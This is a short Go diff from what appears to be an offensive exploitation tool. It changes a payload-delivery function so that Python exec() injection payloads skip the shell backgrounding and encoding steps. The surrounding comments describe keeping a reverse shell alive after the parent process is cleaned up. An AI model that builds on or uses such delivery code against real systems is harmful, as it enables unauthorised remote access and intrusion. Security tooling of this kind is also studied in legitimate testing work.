@@ -157,15 +157,19 @@ func (d *delivery) directPayload() error {
 		return fmt.Errorf("payload generation failed: %w", err)
 	}
 
-	// Background the payload so injection contexts return immediately
-	// and the reverse shell survives parent process cleanup.
-	if d.platform != "windows" {
-		payloadCmd = fmt.Sprintf("(%s &)", payloadCmd)
+	// Python exec() payloads are already a single expression ready to inject.
+	// Shell payloads need backgrounding and encoding.
+	if d.modTarget.Type != "py" {
+		if d.platform != "windows" {
+			payloadCmd = fmt.Sprintf("(%s &)", payloadCmd)
+		}
 	}
 
 	run := BuildContext(d.params, payloadCmd)
 	run.SetTarget(d.modTarget)
-	run.EncoderFn = resolveEncoder(d.params, d.platform)
+	if d.modTarget.Type != "py" {
+		run.EncoderFn = resolveEncoder(d.params, d.platform)
+	}
 	return d.exploit(run)
 }
 
